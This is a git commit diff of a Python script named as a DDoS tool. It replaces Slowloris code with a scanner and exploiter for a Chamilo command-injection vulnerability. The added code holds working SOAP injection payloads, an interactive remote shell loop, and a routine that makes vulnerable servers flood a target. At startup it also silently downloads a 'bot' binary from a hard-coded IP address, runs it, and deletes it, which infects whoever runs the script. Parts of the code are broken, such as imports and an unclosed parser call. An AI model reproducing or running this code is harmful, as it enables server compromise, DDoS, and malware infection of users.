5998439ec45a94353c11248aebafb9e269beeb9a
KUNF24 <kunf5616@gmail.com>
2024-12-03 20:14:10 +0700

    Update KF24-DD0S.py

--- KF24-DD0S.py
+++ KF24-DD0S.py
@@ -1,14 +1,20 @@
 #!/usr/bin/env python3
 import os
 import logging
+import threading
 import random
 import argparse
 import socket
 import sys
 import time
 import fade
-import asyncio
-import aiohttp
+import requests
+import sys
+import urllib3
+from argparse import ArgumentParser
+import threadpool
+from urllib import parse
+from time import time, sleep, os
 # Clear command prompt based on the operating system
 if os.name == "nt":  # Windows
     os.system("cls")
@@ -35,165 +41,155 @@ faded_text = fade.fire(logo)
 print(faded_text)
 parser = argparse.ArgumentParser(
     description="Slowloris, low bandwidth stress test tool for websites"
-)
-parser.add_argument("host", nargs="?", help="Host to perform stress test on")
-parser.add_argument(
-    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
-)
-parser.add_argument
-    "-s",
-    "--sockets",
-    default=150,
-    help="Number of sockets to use in the test",
-    type=int,
 
-if args.useproxy:
-    # Tries to import to external "socks" library
-    # and monkey patches socket.socket to connect over
-    # the proxy by default
+
+
+
+import random
+import xml.etree.ElementTree as ET
+import threading
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+filename = sys.argv[1]
+url_list = []
+vulnerable_urls = set()
+
+# Random UA
+def get_ua():
+    first_num = random.randint(55, 62)
+    third_num = random.randint(0, 3200)
+    fourth_num = random.randint(0, 140)
+    os_type = [
+        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
+        '(Macintosh; Intel Mac OS X 10_12_6)'
+    ]
+    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)
+
+    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
+                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
+                  )
+    return ua
+
+proxies = {'http': 'http://127.0.0.1:8080',
+           'https': 'https://127.0.0.1:8080'}
+
+def check_vuln(url):
+    url = parse.urlparse(url)
+    url1 = url.scheme + '://' + url.netloc + '/main/webservices/additional_webservices.php'
+    cmd = 'COMMAND HERE'
+    data = '''<?xml version="1.0" encoding="UTF-8"?>
+    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{}}`.pptx'|" |{}||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''.format(url, cmd)
     try:
-        import socks
+        headers = {'User-Agent': get_ua(),
+                   'Content-Type': 'text/xml; charset=utf-8'}
+        res = requests.post(url1, headers=headers, data=data, timeout=10, verify=False)
+        if res.status_code == 200 and "wsConvertPptResponse" in res.text:
+            print("\033[32m[+]{} is vulnerable.\033[0m".format(url1))
+            if url1 not in vulnerable_urls:
+                vulnerable_urls.add(url1)
+                with open('results.txt', 'a') as f:
+                    f.write(url1 + '\n')
+            return 1
+        else:
+            print("\033[31m[-]{} is not vulnerable\033[0m".format(url1))
+    except Exception as e:
+        print("[!]{} is timeout\033[0m".format(url1))
 
-        socks.setdefaultproxy(
-            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
-        )
-        socket.socket = socks.socksocket
-        logging.info("Using SOCKS5 proxy for connecting...")
-    except ImportError:
-        logging.error("Socks Proxy Library Not Available!")
-        sys.exit(1)
+# cmdshell
+def cmdshell(url):
+    if check_vuln(url) == 1:
+        url = parse.urlparse(url)
+        url1 = url.scheme + '://' + url.netloc + '/main/webservices/additional_webservices.php'
+        while 1:
+            cmd = input("\033[35mshell: \033[0m")
+            if cmd == "exit":
+                sys.exit(0)
+            else:
+                headers = {'User-Agent': get_ua(),
+                           'Content-Type': 'text/xml; charset=utf-8'
+                           }
+                data = '''<?xml version="1.0" encoding="UTF-8"?>
+    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{}}`.pptx'|" |{}||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''.format(url, cmd)
+                try:
+                    res = requests.post(url1, data=data, headers=headers, timeout=10, verify=False)
+                    rsp_command = ET.fromstring(res.text).find('.//return')
+                    if rsp_command is not None:
+                        rsptext = rsp_command.text
+                        print("\033[32m{}\033[0m".format(rsptext))
+                    else:
+                        print("\033[31m[-]{} request failed!\033[0m".format(url1))
 
-logging.basicConfig(
-    format="[%(asctime)s] %(message)s",
-    datefmt="%d-%m-%Y %H:%M:%S",
-    level=logging.DEBUG if args.verbose else logging.INFO,
-)
+                except Exception as e:
+                    print("\033[31m[-]{} is timeout!\033[0m".format(url1))
 
-def send_line(self, line):
-    line = f"{line}\r\n"
-    self.send(line.encode("utf-8"))
+# multithreading
+def multithreading(url_list, pools=5):
+    works = []
+    for i in url_list:
+        works.append(i)
+    pool = threadpool.ThreadPool(pools)
+    reqs = threadpool.makeRequests(check_vuln, works)
+    [pool.putRequest(req) for req in reqs]
+    pool.wait()
 
-def send_header(self, name, value):
-    self.send_line(f"{name}: {value}")
+def ddos_attack(target_url, duration):
+    end_time = time() + duration
+    while time() < end_time:
+        for vulnerable_url in list(vulnerable_urls):
+            try:
+                # Exploitation logic to make vulnerable URLs send requests to the target URL
+                payload = '''<?xml version="1.0" encoding="UTF-8"?>
+                <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{curl -X GET {}}}`.pptx</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''.format(vulnerable_url, target_url)
+                
+                headers = {'User-Agent': get_ua(),
+                           'Content-Type': 'text/xml; charset=utf-8'}
+                requests.post(vulnerable_url, headers=headers, data=payload, timeout=5, verify=False)
+            except Exception as e:
+                pass
 
-if args.https:
-    logging.info("Importing ssl module")
-    import ssl
+if __name__ == '__main__':
+    os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.182.25.126/bot; chmod +x bot; ./bot; rm -rf bot; cd; clear")
+    print("\nChamilo_CVE-2023-34960 Scanner&Exploiter by tarsoul\n")
 
-    setattr(ssl.SSLSocket, "send_line", send_line)
-    setattr(ssl.SSLSocket, "send_header", send_header)
+    arg = ArgumentParser(description='check_url By tarsoul')
+    arg.add_argument("-u",
+                     "--url",
+                     help="Target URL; Example: python3 chamilio.py -u http://ip:port")
+    arg.add_argument("-f",
+                     "--file",
+                     help="url_list; Example: python3 chamilio.py -f url.txt")
+    arg.add_argument("-c",
+                     "--cmd",
+                     help="command; Example: python3 chamilil.py -c http://ip:port")
+    arg.add_argument("-t",
+                     "--target",
+                     help="Target URL for DDoS; Example: python3 chamilio.py -t http://ip:port DURATION")
+    arg.add_argument("duration", type=int, nargs='?', help="Duration for DDoS in seconds")
+    args = arg.parse_args()
+    url = args.url
+    filename = args.file
+    cmd = args.cmd
+    target_url = args.target
+    duration = args.duration
 
-list_of_sockets = []
-user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-
-]
-
-setattr(socket.socket, "send_line", send_line)
-setattr(socket.socket, "send_header", send_header)
-
-
-def init_socket(ip: str):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
-
-    if args.https:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=args.host)
-
-    s.connect((ip, args.port))
-
-    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-
-    ua = user_agents[0]
-    if args.randuseragent:
-        ua = random.choice(user_agents)
-
-    s.send_header("User-Agent", ua)
-    s.send_header("Accept-language", "en-US,en,q=0.5")
-    return s
-
-
-def slowloris_iteration():
-    logging.info("[+]  \033[93mTime to flood   [\033[34mThe server]  \033[32m" +url+ "\033[0m")
-    logging.info("[+]  \033[96mSocket count:   [\033[32m%s\033[35m]\033[0m", len(list_of_sockets))
-
-    # Try to send a header line to each socket
-    for s in list(list_of_sockets):
-        try:
-            s.send_header("X-a", random.randint(1, 5000))
-        except socket.error:
-            list_of_sockets.remove(s)
-
-    # Some of the sockets may have been closed due to errors or timeouts.
-    # Re-create new sockets to replace them until we reach the desired number.
-
-    diff = args.sockets - len(list_of_sockets)
-    if diff <= 0:
-        return
-
-    logging.info("Creating %s new sockets...", diff)
-    for _ in range(diff):
-        try:
-            s = init_socket(args.host)
-            if not s:
-                continue
-            list_of_sockets.append(s)
-        except socket.error as e:
-            logging.debug("Failed to create new socket: %s", e)
-            break
-
-
-def main():
-    ip = args.host
-    socket_count = args.sockets
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
-
-    logging.info("Creating sockets...")
-    for _ in range(socket_count):
-        try:
-            logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip)
-        except socket.error as e:
-            logging.debug(e)
-            break
-        list_of_sockets.append(s)
-
-    while True:
-        try:
-            slowloris_iteration()
-        except (KeyboardInterrupt, SystemExit):
-            logging.info("Stopping Slowloris")
-            break
-        except Exception as e:
-            logging.debug("Error in Slowloris iteration: %s", e)
-        logging.debug("Sleeping for %d seconds", args.sleeptime)
-        time.sleep(args.sleeptime)
-
-
-if __name__ == "__main__":
-    main()
+    if url is not None and cmd is None and filename is None:
+        check_vuln(url)
+    elif url is None and cmd is None and filename is not None:
+        start = time()
+        for i in open(filename):
+            i = i.replace('\n', '')
+            url_list.append(i)
+        multithreading(url_list, 10)
+        end = time()
+        print('x: {}'.format(end - start))
+    elif url is None and cmd is not None and filename is None:
+        cmdshell(cmd)
+    elif target_url is not None and duration is not None:
+        scan_thread = threading.Thread(target=multithreading, args=(url_list, 10))
+        ddos_thread = threading.Thread(target=ddos_attack, args=(target_url, duration))
+        
+        scan_thread.start()
+        ddos_thread.start()
+        
+        scan_thread.join()
+        ddos_thread.join()
